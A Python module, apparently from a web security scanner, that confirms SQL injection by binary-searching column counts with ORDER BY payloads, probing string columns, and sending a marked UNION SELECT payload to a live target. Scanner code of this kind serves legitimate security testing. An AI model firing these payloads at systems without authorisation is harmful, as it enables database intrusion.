"""Dynamic UNION column bisection for the SQLi detector.

Mixin for SQLiDetector: binary-search ORDER BY column counting and
string-column type probing, producing a precise UNION SELECT payload.
"""

from __future__ import annotations

import random
import string

from titan.core.logger import get_logger
from titan.core.models import AttackType, Finding, Severity
from titan.modules.sqli.signatures import (
    SQLI_ERROR_SIGNATURES as _SQLI_ERROR_SIGNATURES,
)

logger = get_logger("detector")


class UnionBisectMixin:
    async def _scan_union_bisect(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: dict[str, str],
        seed_finding: Finding,
    ) -> list[Finding]:
        """
        Binary search for the exact column count using ORDER BY, then
        type-probe which columns accept strings. Returns a precise UNION
        SELECT finding with a real column count, not a hardcoded guess.
        """
        findings: list[Finding] = []
        param_name = seed_finding.param
        if param_name not in params:
            return findings

        # Step 1: Binary-search ORDER BY to find column count (max 64)
        col_count = await self._bisect_column_count(context, url, method, params, param_name)
        if col_count == 0:
            return findings

        # Step 2: Find string-accepting columns
        string_cols = await self._probe_string_columns(context, url, method, params, param_name, col_count)

        if string_cols:
            marker = "TITAN" + "".join(random.choices(string.ascii_uppercase, k=6))
            nulls = ["NULL"] * col_count
            for col_idx in string_cols:
                nulls[col_idx] = f"'{marker}'"
            union_payload = "' UNION SELECT " + ",".join(nulls) + "--"

            try:
                test_params = dict(params)
                test_params[param_name] = union_payload
                if method == "GET":
                    resp = await context.request.get(url, params=test_params, timeout=3000)
                else:
                    resp = await context.request.post(url, data=test_params, timeout=3000)
                body = await resp.text()

                if marker in body:
                    findings.append(
                        Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=union_payload,
                            attack_type=AttackType.SQLI,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.98,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=[f"union_marker_reflected:{marker}", f"union_cols:{col_count}"],
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={
                                "column_count": col_count,
                                "string_columns": string_cols,
                                "injection_location": "union_bisect",
                            },
                        )
                    )
            except Exception as exc:
                logger.debug(f"suppressed exception: {exc}")
                pass

        return findings

    async def _bisect_column_count(
        self,
        context,
        url: str,
        method: str,
        params: dict[str, str],
        param_name: str,
    ) -> int:
        """
        Binary search using ORDER BY to find the exact column count.
        Returns 0 if injection is not present or column count not found.
        """
        lo, hi = 1, 64

        # Verify ORDER BY 1 succeeds and ORDER BY 65 fails (confirm injectable)
        def _make_params(n: int) -> dict[str, str]:
            p = dict(params)
            p[param_name] = f"' ORDER BY {n}--"
            return p

        try:
            if method == "GET":
                r_low = await context.request.get(url, params=_make_params(1), timeout=3000)
                r_high = await context.request.get(url, params=_make_params(65), timeout=3000)
            else:
                r_low = await context.request.post(url, data=_make_params(1), timeout=3000)
                r_high = await context.request.post(url, data=_make_params(65), timeout=3000)
            low_body = await r_low.text()
            high_body = await r_high.text()
        except Exception:
            return 0

        # If both responses are identical the endpoint isn't injectable via ORDER BY
        if low_body == high_body:
            return 0

        # Binary search
        while lo < hi:
            mid = (lo + hi + 1) // 2
            try:
                p = _make_params(mid)
                if method == "GET":
                    r = await context.request.get(url, params=p, timeout=3000)
                else:
                    r = await context.request.post(url, data=p, timeout=3000)
                body = await r.text()
                # If ORDER BY mid produces the "good" response, column count >= mid
                if body == low_body:
                    lo = mid
                else:
                    hi = mid - 1
            except Exception:
                hi = mid - 1

        return lo

    async def _probe_string_columns(
        self,
        context,
        url: str,
        method: str,
        params: dict[str, str],
        param_name: str,
        col_count: int,
    ) -> list[int]:
        """
        For each column index, replace its NULL with a quoted string marker.
        Columns that do not throw a type error are string-compatible.
        Returns list of zero-based string-accepting column indices.
        """
        string_cols: list[int] = []
        marker = "COLPROBE"

        for i in range(col_count):
            nulls = ["NULL"] * col_count
            nulls[i] = f"'{marker}'"
            probe = "' UNION SELECT " + ",".join(nulls) + "--"
            try:
                test_params = dict(params)
                test_params[param_name] = probe
                if method == "GET":
                    r = await context.request.get(url, params=test_params, timeout=3000)
                else:
                    r = await context.request.post(url, data=test_params, timeout=3000)
                body = await r.text()
                has_error = any(s in body.lower() for s in _SQLI_ERROR_SIGNATURES)
                if not has_error and r.status < 500:
                    string_cols.append(i)
            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        return string_cols
